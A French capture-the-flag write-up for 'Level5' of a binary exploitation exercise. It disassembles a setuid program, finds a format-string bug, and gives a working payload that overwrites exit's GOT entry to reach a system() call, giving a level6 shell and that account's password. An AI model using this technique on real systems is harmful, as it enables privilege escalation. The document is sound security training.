# Level5

> login:password -> *`level5:0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a`*
```
:~$ su level5
Password:0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a
```
---

```
:~$ pwd
/home/user/level5
```

```
:~$ ls -la
total 17
dr-xr-x---+ 1 level5 level5   80 Mar  6  2016 .
dr-x--x--x  1 root   root    340 Sep 23  2015 ..
-rw-r--r--  1 level5 level5  220 Apr  3  2012 .bash_logout
-rw-r--r--  1 level5 level5 3530 Sep 23  2015 .bashrc
-rwsr-s---+ 1 level6 users  5385 Mar  6  2016 level5
-rw-r--r--+ 1 level5 level5   65 Sep 23  2015 .pass
-rw-r--r--  1 level5 level5  675 Apr  3  2012 .profile
```

Le Home contient un binaire `level5` :

```
:~$ ./level5
(input) test
test

:~$ ./level5 test
(input) test
test
```

Avec ou sans paramètre, le binaire attends un input

```
:~$ gdb level5
...

(gdb) disas main
Dump of assembler code for function main:
   0x08048504 <+0>:	    push   %ebp
   0x08048505 <+1>:	    mov    %esp,%ebp
   0x08048507 <+3>:	    and    $0xfffffff0,%esp
   0x0804850a <+6>:	    call   0x80484c2 <n>
   0x0804850f <+11>:	leave  
   0x08048510 <+12>:	ret    
End of assembler dump.

(gdb) disas n
Dump of assembler code for function n:
   0x080484c2 <+0>:	push   %ebp
   0x080484c3 <+1>:	mov    %esp,%ebp
   0x080484c5 <+3>:	sub    $0x218,%esp
   0x080484cb <+9>:	mov    0x8049848,%eax
   0x080484d0 <+14>:	mov    %eax,0x8(%esp)
   0x080484d4 <+18>:	movl   $0x200,0x4(%esp)
   0x080484dc <+26>:	lea    -0x208(%ebp),%eax
   0x080484e2 <+32>:	mov    %eax,(%esp)
   0x080484e5 <+35>:	call   0x80483a0 <fgets@plt>
   0x080484ea <+40>:	lea    -0x208(%ebp),%eax
   0x080484f0 <+46>:	mov    %eax,(%esp)
   0x080484f3 <+49>:	call   0x8048380 <printf@plt>
   0x080484f8 <+54>:	movl   $0x1,(%esp)
   0x080484ff <+61>:	call   0x80483d0 <exit@plt>
End of assembler dump.
```

Le main va appeller une fonction `n()` (+6) et a l'intérieur de celle-ci on retrouve à nouveau `printf()` (+49) mais pas fonction `system()` ou autre moyen d'acceder au stdin, donc on va voir si on trouve d'autres fonctions utiles


```
(gdb) info functions
All defined functions:

Non-debugging symbols:
(...)
0x08048380  printf@plt
(...)
0x08048390  _exit@plt
(...)
0x080483a0  fgets@plt
(...)
0x080483b0  system@plt
(...)
0x080483d0  exit@plt
(...)
0x080484a4  o
0x080484c2  n
0x08048504  main
(...)
```

Finalement on retrouve bien l'utilisation d'une fonction `system()`, mais egalement l'utilisation d'une fonction `o()` qui semble inexploitée

```
(gdb) disas o
Dump of assembler code for function o:
   (...)
   0x080484aa <+6>:	    movl   $0x80485f0,(%esp)
   0x080484b1 <+13>:	call   0x80483b0 <system@plt>
   0x080484b6 <+18>:	movl   $0x1,(%esp)
   0x080484bd <+25>:	call   0x8048390 <_exit@plt>
End of assembler dump.
```

On determine du coup que la fonction `o()` pourra etre utilise pour atteindre le stdin, mais pour ce faire on va de nouveau exploiter `printf()`

```
:~$ python -c 'print " %x" * 4' | ./level5
 200 b7fd1ac0 b7ff37d0 25207825

:~$ python -c 'print "aaaa" + " %x" * 4' | ./level5
aaaa 200 b7fd1ac0 b7ff37d0 61616161
```

On decouvre que notre buffer est en 4e position. Apres la fonction `printf()` on trouve un appel de la fonction `exit()`, on va donc faire en sorte de remplacer l'adresse de cette derniere, par l'appel de la fonction `o()`

```
(gdb) info function exit
All defined functions:

Non-debugging symbols:
(...)
0x080483d0  exit@plt

(gdb) x/i 0x080483d0
   0x80483d0 <exit@plt>:	jmp    *0x8049838

(gdb) info function o
All defined functions:

Non-debugging symbols:
(...)
0x080484a4  o
(...)
```

On obtient ainsi les adresses desirees dans le GOT*:
- `exit()` : **0x8049838**
- `o()` : **0x080484a4**


À present on a toutes les informations neccessaires, il est tant de preparer notre exploit.

On traduit adresse de la fonction `exit()` dans le GOT: "\x38\x98\x04\x08" (ce qui nous donne **4 bytes**)

Puis on prend la valeur décimal pour atteindre `o()`: 134513828

> 134513828 - 4 = **134513824 bytes**

```
:~$ python -c 'print "\x38\x98\x04\x08" + "%134513824d%4$n"' > /tmp/level5

:~$ cat /tmp/level5 - | ./level5
(...)
whoami
level6
cat /home/user/level6/.pass
d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31
```



_Informations supplementaires_:
>*Global Offset Table, or GOT, is a section of a computer program's (executables and shared libraries) memory used to enable computer program code compiled as an ELF file to run correctly, independent of the memory address where the program's code or data is loaded at runtime.